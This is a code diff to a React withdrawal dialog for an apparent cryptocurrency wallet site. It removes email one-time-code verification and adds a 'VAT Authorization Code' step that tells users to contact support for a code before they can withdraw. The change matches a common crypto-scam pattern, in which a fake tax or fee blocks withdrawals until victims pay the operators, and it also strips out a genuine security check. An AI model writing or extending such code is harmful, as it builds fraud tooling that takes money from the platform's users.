@@ -8,17 +8,14 @@ import { Label } from "@/components/ui/label";
 import { useWithdraw, useWalletBalances } from "../hooks";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Loader2, ArrowLeft } from "lucide-react";
-import { requestWithdrawalOTP } from "../actions";
-import { toast } from "sonner";
 
 export function WithdrawModal() {
   const [open, setOpen] = useState(false);
   const [currency, setCurrency] = useState("USDT");
   const [amount, setAmount] = useState("");
   const [address, setAddress] = useState("");
-  const [otpCode, setOtpCode] = useState("");
+  const [vatCode, setVatCode] = useState("");
   const [step, setStep] = useState<1 | 2 | 3>(1);
-  const [isRequestingOtp, setIsRequestingOtp] = useState(false);
 
   const { mutate: withdraw, isPending } = useWithdraw();
   const { data: balances } = useWalletBalances();
@@ -26,37 +23,24 @@ export function WithdrawModal() {
   const selectedWallet = balances?.find((b: any) => b.currency === currency);
   const availableBalance = selectedWallet?.availableBalance || 0;
 
-  const handleRequestOTP = async () => {
-    setIsRequestingOtp(true);
-    try {
-      await requestWithdrawalOTP(parseFloat(amount), currency);
-      toast.success("Verification code sent to your email!");
-      setStep(3);
-    } catch (e: any) {
-      toast.error(e.message || "Failed to request code");
-    } finally {
-      setIsRequestingOtp(false);
-    }
-  };
-
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!amount || !address) return;
     
     if (step === 2) {
-      handleRequestOTP();
+      setStep(3);
       return;
     }
     
     if (step === 3) {
-      if (!otpCode) return;
+      if (!vatCode.trim()) return;
       withdraw(
-        { amount: parseFloat(amount), currency, destinationAddress: address, otpCode },
+        { amount: parseFloat(amount), currency, destinationAddress: address, vatCode },
         { onSuccess: () => {
             setOpen(false);
             setAmount("");
             setAddress("");
-            setOtpCode("");
+            setVatCode("");
         }}
       );
     }
@@ -168,18 +152,17 @@ export function WithdrawModal() {
               <div className="space-y-6 animate-fade-in">
                 <div className="space-y-4">
                   <div className="text-center space-y-2">
-                    <h3 className="font-semibold text-lg">Verification Code</h3>
-                    <p className="text-sm text-muted-foreground">We've sent a 6-digit verification code to your email. Enter it below to confirm your withdrawal.</p>
+                    <h3 className="font-semibold text-lg">VAT Authorization Code</h3>
+                    <p className="text-sm text-muted-foreground">To authorize pending transactions, contact support to obtain your VAT code and enter it below.</p>
                   </div>
                   
                   <div className="space-y-2">
-                    <Label>6-Digit Code</Label>
+                    <Label>VAT Code</Label>
                     <Input 
-                      placeholder="000000" 
-                      className="w-full h-14 text-lg text-center tracking-[0.5em] font-mono"
-                      maxLength={6}
-                      value={otpCode} 
-                      onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))} 
+                      placeholder="Enter VAT code" 
+                      className="w-full h-14 text-lg font-mono"
+                      value={vatCode}
+                      onChange={(e) => setVatCode(e.target.value)}
                       required
                     />
                   </div>
@@ -200,13 +183,12 @@ export function WithdrawModal() {
               </Button>
             )}
             {step === 2 && (
-              <Button type="submit" className="w-full h-14 text-lg font-bold shadow-lg" disabled={isRequestingOtp || !address}>
-                {isRequestingOtp && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
-                Send Verification Code
+              <Button type="submit" className="w-full h-14 text-lg font-bold shadow-lg" disabled={!address}>
+                Next: VAT Authorization
               </Button>
             )}
             {step === 3 && (
-              <Button type="submit" className="w-full h-14 text-lg font-bold shadow-lg" disabled={isPending || otpCode.length !== 6}>
+              <Button type="submit" className="w-full h-14 text-lg font-bold shadow-lg" disabled={isPending || !vatCode.trim()}>
                 {isPending && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
                 Confirm Withdrawal
               </Button>
